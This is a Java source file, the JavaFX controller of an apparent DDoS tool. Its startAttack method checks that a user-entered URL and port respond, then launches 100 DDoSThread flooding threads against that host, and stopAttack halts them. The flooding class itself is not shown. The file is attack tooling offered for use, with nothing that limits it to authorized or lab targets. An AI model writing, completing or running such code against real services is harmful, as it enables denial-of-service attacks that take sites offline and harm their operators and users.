package sample;

import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.ListView;
import javafx.scene.control.TextField;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.concurrent.atomic.AtomicBoolean;

public class Controller {
    public Button startButton;
    public TextField portText;
    public Button stopButton;
    public TextField urlText;
    public ListView<String> logText;
    private final ArrayList<DDoSThread> threads = new ArrayList<>();
    private final AtomicBoolean running = new AtomicBoolean(true);
    public Label errorLabel;
    ObservableList<String> list = FXCollections.observableArrayList();

    public void startAttack(ActionEvent actionEvent) {
        HttpURLConnection connection;
        try {
            //check if the server is live
            URL url = new URL(urlText.getText() + portText.getText());
            connection = (HttpURLConnection) url.openConnection();
            connection.connect();
            int res = connection.getResponseCode();
            running.set(true);
            System.out.print(res);

            // if connection succeeded create a new DDoSThread and start attack
            errorLabel.setText("");
            logText.setItems(list);
            for (int i = 0; i < 100; i++) {
                try {
                    DDoSThread thread = new DDoSThread(urlText.getText(), portText.getText(), list, running);
                    thread.start();
                    threads.add(thread);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        // catch UnknownHostException and other exceptions
        catch (UnknownHostException e) {
            System.out.print(e.getMessage());
            errorLabel.setText("Unknown Host " + urlText.getText() + portText.getText());
        } catch (Exception e) {
            errorLabel.setText("Connection Timeout " + urlText.getText() + portText.getText());
            e.printStackTrace();
        }
    }

    public void stopAttack(ActionEvent actionEvent) {
        for (int i = 0; i < threads.toArray().length; i++) {
            threads.get(i).stop();
            running.set(false);
        }
    }
}
